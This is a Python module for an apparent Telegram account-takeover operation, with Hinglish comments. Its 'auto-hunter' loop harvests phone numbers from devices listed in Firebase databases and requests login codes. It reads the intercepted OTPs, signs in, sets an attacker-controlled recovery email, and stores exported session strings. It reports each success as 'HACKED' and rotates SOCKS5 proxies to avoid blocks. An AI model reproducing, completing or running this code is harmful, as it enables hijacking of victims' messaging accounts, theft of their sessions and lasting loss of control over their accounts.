# services/telegram_automation.py
import asyncio
import logging
import time
import random
import traceback
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError
from pyrogram.enums import SentCodeType
import config
import database as db
import firebase_utils as fbu

log = logging.getLogger("TGAuto")

async def update_owner_progress(bot, text):
    try:
        await bot.send_message(config.MAIN_OWNER, f"🤖 <b>AI PROGRESS:</b>\n{text}", parse_mode="HTML")
    except:
        pass

# 🚨 PROXY HELPER (Smart Rotation)
def get_proxy(d, attempt=0):
    proxies = d.get("working_proxies", [])
    if not proxies:
        return None # Direct connection
    if attempt < len(proxies):
        p = proxies[attempt]
        ip, port = p.split(":")[:2]
        return {"scheme": "socks5", "hostname": ip, "port": int(port)}
    return None # Saari fail, direct try karo

# ... (wait_for_firebase_otp same rahega)

# 🚨 UPDATED: Manual Login with Smart Proxy Rotation
async def auto_login_manual(bot, phone_number):
    log.info(f"Manual Login triggered for {phone_number}")
    await update_owner_progress(bot, f"🔍 <b>Manual Login:</b> <code>{phone_number}</code>")

    d = db.load_data()
    max_retries = 3
    sent_code = None
    
    for attempt in range(max_retries):
        proxy_dict = get_proxy(d, attempt)
        app = None
        try:
            app = Client(f"temp_{phone_number.replace('+','')}", api_id=config.TG_API_ID, api_hash=config.TG_API_HASH, phone_number=phone_number, in_memory=True, proxy=proxy_dict)
            await app.connect()
            sent_code = await app.send_code(phone_number)
            break
        except FloodWait as e:
            if app and app.is_connected: await app.disconnect()
            return {"status": "failed", "reason": f"FloodWait: {e.value}s"}
        except Exception as e:
            if app and app.is_connected: await app.disconnect()
            log.warning(f"Attempt {attempt+1} failed with proxy {proxy_dict}: {e}")
            if attempt == max_retries - 1:
                return {"status": "failed", "reason": f"Connection failed after {max_retries} attempts."}
            await asyncio.sleep(2)

    if not sent_code:
        return {"status": "failed", "reason": "Could not send code."}

    otp = await wait_for_firebase_otp(phone_number)
    if not otp:
        if app and app.is_connected: await app.disconnect()
        return {"status": "failed", "reason": "OTP nahi aaya."}

    try:
        await app.sign_in(phone_number, sent_code.phone_code_hash, otp)
        await app.update_profile(email=config.MASTER_EMAIL)
        session_string = await app.export_session_string()
        await app.disconnect()
        return {"status": "success", "session": session_string, "phone": phone_number}
    except SessionPasswordNeeded:
        if app and app.is_connected: await app.disconnect()
        return {"status": "failed", "reason": "2FA Password Enabled."}
    except Exception as e:
        if app and app.is_connected: await app.disconnect()
        return {"status": "failed", "reason": str(e)}

# 🚨 UPDATED: Auto Hunter Loop with Smart Proxy Rotation
async def auto_hunter_loop(bot):
    log.info("🔥 GHATAK AUTO-HUNTER STARTED...")
    while True:
        try:
            d = db.load_data()
            if not d.get("hunting_enabled", True):
                await asyncio.sleep(10)
                continue

            online_devices = []
            for fb in d.get("firebases", [])[:10]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                for dev_id, c in clients.items():
                    if isinstance(c, dict) and c.get("status") is True:
                        online_devices.append((fb, dev_id, c))

            for fb, dev_id, dev_data in online_devices:
                best_nums = fbu.extract_best_numbers(dev_data, [])
                if not best_nums: continue
                phone = f"+91{best_nums[0][0]}"
                
                if phone in d.get("telegram_accounts", {}) and d["telegram_accounts"][phone].get("status") == "active":
                    continue

                app = None
                sent_code = None
                
                # Proxy Rotation Try
                for attempt in range(2): # 2 attempts (proxy aur direct)
                    proxy_dict = get_proxy(d, attempt)
                    try:
                        app = Client(f"temp_{phone.replace('+','')}", api_id=config.TG_API_ID, api_hash=config.TG_API_HASH, phone_number=phone, in_memory=True, proxy=proxy_dict)
                        await app.connect()
                        sent_code = await app.send_code(phone)
                        break
                    except Exception as e:
                        if app and app.is_connected: await app.disconnect()
                        log.warning(f"Hunter attempt {attempt+1} failed: {e}")

                if not sent_code:
                    continue

                otp = await wait_for_firebase_otp(phone)
                if not otp:
                    if app and app.is_connected: await app.disconnect()
                    continue

                try:
                    await app.sign_in(phone, sent_code.phone_code_hash, otp)
                    await app.update_profile(email=config.MASTER_EMAIL)
                    session_string = await app.export_session_string()
                    d = db.load_data()
                    d["telegram_accounts"][phone] = {"status": "active", "session": session_string, "device_id": dev_id, "fb_url": fb['url']}
                    db.save_data(d)
                    await update_owner_progress(bot, f"✅ <b>HACKED!</b> <code>{phone}</code>")
                except SessionPasswordNeeded:
                    d = db.load_data()
                    d["telegram_accounts"][phone] = {"status": "waiting_7_days", "session": "", "reset_time": int(time.time()) + (7*24*3600), "device_id": dev_id}
                    db.save_data(d)
                except Exception as e:
                    log.error(f"Sign-in failed: {e}")
                finally:
                    if app and app.is_connected: await app.disconnect()

                await asyncio.sleep(3)
            
            await asyncio.sleep(10)
        except Exception as e:
            log.error(f"Hunter Loop Error: {e}")
            await asyncio.sleep(10)

# ... (reset_watchdog_loop, initiate_user_login, complete_user_login same rahenge, unhe waise hi chhod dena)
